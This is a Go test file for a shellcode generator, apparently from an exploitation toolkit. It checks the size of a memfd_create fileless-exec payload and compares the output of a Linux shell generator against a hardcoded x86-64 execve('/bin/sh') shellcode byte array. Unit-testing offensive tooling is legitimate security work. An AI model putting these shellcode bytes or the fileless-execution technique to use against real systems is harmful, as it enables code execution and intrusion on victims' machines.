package shellcode

import (
	"bytes"
	"testing"
)

func TestX8664MemFdExec(t *testing.T) {
	payload := `
#/bin/bash

echo "Hello from memfd_create exec sploit shellcode" > ./success.txt
`

	x8664 := NewX8664()
	shellcode, err := x8664.LinuxMemFdExec([]byte(payload))
	if err != nil {
		t.Fatal(err)
	}

	if len(shellcode) != 263 {
		t.Fatal("Shellcode size != 263")
	}
}

func TestX8664LinuxShell(t *testing.T) {
	x8664 := NewX8664()
	shellcode, err := x8664.LinuxShell()
	if err != nil {
		t.Fatal(err)
	}

	scBytes := []byte{0x31, 0xc0, 0x48, 0xbb, 0xd1, 0x9d, 0x96, 0x91,
		0xd0, 0x8c, 0x97, 0xff, 0x48, 0xf7, 0xdb, 0x53,
		0x54, 0x5f, 0x99, 0x52, 0x57, 0x54, 0x5e, 0xb0,
		0x3b, 0x0f, 0x05}

	if bytes.Compare(shellcode, scBytes) != 0 {
		t.Fatal("Shellcode bytes != expected")
	}
}
